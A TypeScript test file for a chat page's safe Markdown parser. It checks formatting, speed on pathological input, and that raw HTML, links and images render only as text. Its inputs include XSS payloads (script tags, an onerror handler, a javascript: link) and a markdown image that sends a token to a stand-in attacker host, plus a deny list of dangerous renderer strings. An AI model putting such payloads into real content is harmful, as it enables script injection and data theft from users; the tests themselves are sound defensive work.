// Tests of the safe Markdown subset of the Chat page (#492). Run: npm test (node --test, no dependencies).
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { MAX_CHARS, parse, type Block, type Inline } from '../src/markdown.ts'

type Node = Block | Inline

// every node of the tree, depth first
function walk(b: Block[]): Node[] {
  const out: Node[] = []
  const inl = (c: Inline[]) => { for (const n of c) { out.push(n); if (n.t === 'strong' || n.t === 'em') inl(n.c) } }
  for (const n of b) {
    out.push(n)
    if (n.t === 'p' || n.t === 'h') inl(n.c)
    if (n.t === 'quote') out.push(...walk(n.c))
    if (n.t === 'list') for (const it of n.items) out.push(...walk(it))
    if (n.t === 'table') { n.head.forEach(inl); n.rows.forEach((r) => r.forEach(inl)) }
  }
  return out
}

// all the text the tree shows, as one string
const shown = (b: Block[]) => walk(b).map((n) => ('v' in n ? n.v : '')).join('')

test('headings, a list, a GFM table and a fenced code block are formatted', () => {
  const md = [
    '# Plan', '', 'Some **bold** and *italic* and `code`.', '',
    '## Steps', '', '1. first', '2. second', '   - nested', '', '- [x] a', '- b', '',
    '| Name | Size |', '|:-----|-----:|', '| a | 1 |', '| `b\\|c` | 2 |', '',
    '```go', 'func main() {', '\tfmt.Println("<b>")', '}', '```', '',
    '> quoted', '', '---',
  ].join('\n')
  const b = parse(md)
  assert.deepEqual(b.map((n) => n.t), ['h', 'p', 'h', 'list', 'list', 'table', 'pre', 'quote', 'hr'])
  assert.deepEqual(b[0], { t: 'h', level: 1, c: [{ t: 'text', v: 'Plan' }] })
  assert.deepEqual(b[1], { t: 'p', c: [
    { t: 'text', v: 'Some ' }, { t: 'strong', c: [{ t: 'text', v: 'bold' }] }, { t: 'text', v: ' and ' },
    { t: 'em', c: [{ t: 'text', v: 'italic' }] }, { t: 'text', v: ' and ' }, { t: 'code', v: 'code' }, { t: 'text', v: '.' },
  ] })
  const ol = b[3]
  assert.ok(ol.t === 'list' && ol.ordered && ol.start === 1 && ol.items.length === 2)
  assert.deepEqual(ol.items[1].map((n) => n.t), ['p', 'list'])
  const ul = b[4]
  assert.ok(ul.t === 'list' && !ul.ordered && ul.items.length === 2)
  const t = b[5]
  assert.ok(t.t === 'table')
  assert.deepEqual(t.align, ['left', 'right'])
  assert.deepEqual(t.head, [[{ t: 'text', v: 'Name' }], [{ t: 'text', v: 'Size' }]])
  assert.deepEqual(t.rows[1][0], [{ t: 'code', v: 'b|c' }])
  assert.deepEqual(b[6], { t: 'pre', lang: 'go', v: 'func main() {\n\tfmt.Println("<b>")\n}' })
})

test('bold italic, escapes, intraword underscores and setext headings', () => {
  assert.deepEqual(parse('***x***')[0], { t: 'p', c: [{ t: 'strong', c: [{ t: 'em', c: [{ t: 'text', v: 'x' }] }] }] })
  assert.deepEqual(parse('\\*not\\* snake_case_name 2 * 3')[0], { t: 'p', c: [{ t: 'text', v: '*not* snake_case_name 2 * 3' }] })
  assert.deepEqual(parse('Title\n===').map((n) => n.t), ['h'])
  assert.deepEqual(parse('``a ` b``')[0], { t: 'p', c: [{ t: 'code', v: 'a ` b' }] })
})

test('raw HTML, links and images render no element: only text with the address', () => {
  const md = [
    '<script>alert(1)</script>',
    '<img src=https://evil.example/a.png onerror=alert(1)>',
    '<a href="https://evil.example/x">click</a>',
    '![secret](https://evil.example/leak?d=token)',
    '[**docs**](https://evil.example/docs "title")',
    '<https://evil.example/auto> [x](javascript:alert(1))',
    '[ref]: https://evil.example/ref',
  ].join('\n\n')
  const b = parse(md)
  const types = new Set(walk(b).map((n) => n.t))
  for (const ty of types) assert.ok(['p', 'text', 'strong'].includes(ty), `unexpected node ${ty}`)
  const text = shown(b)
  for (const s of [
    '<script>alert(1)</script>', '<img src=https://evil.example/a.png onerror=alert(1)>',
    '<a href="https://evil.example/x">click</a>', 'secret (image: https://evil.example/leak?d=token)',
    'docs (https://evil.example/docs)', '<https://evil.example/auto>', 'x (javascript:alert(1))',
    '[ref]: https://evil.example/ref',
  ]) assert.ok(text.includes(s), `missing text: ${s}`)
  // HTML inside a code block or a table stays text too
  assert.deepEqual(walk(parse('| a |\n|---|\n| <img src=x> |')).filter((n) => n.t === 'text').map((n) => 'v' in n && n.v), ['a', '<img src=x>'])
})

test('the renderer has no way to make a link, an image, raw HTML or a handler', () => {
  const src = readFileSync(new URL('../src/Markdown.tsx', import.meta.url), 'utf8')
  for (const bad of ['dangerouslySetInnerHTML', 'href', 'src=', '<a ', '<img', '<iframe', 'onClick', 'innerHTML']) {
    assert.ok(!src.includes(bad), `Markdown.tsx contains ${bad}`)
  }
})

test('pathological input stays fast and deep nesting stays bounded', () => {
  const n = MAX_CHARS - 10
  for (const s of ['*'.repeat(n), '_a'.repeat(n / 2), '['.repeat(n), '`'.repeat(n), '> '.repeat(n / 2), '- '.repeat(n / 2), '*a '.repeat(n / 3), '![]('.repeat(n / 4)]) {
    const t0 = Date.now()
    parse(s)
    assert.ok(Date.now() - t0 < 2000, `slow on ${s.slice(0, 8)}…`)
  }
})
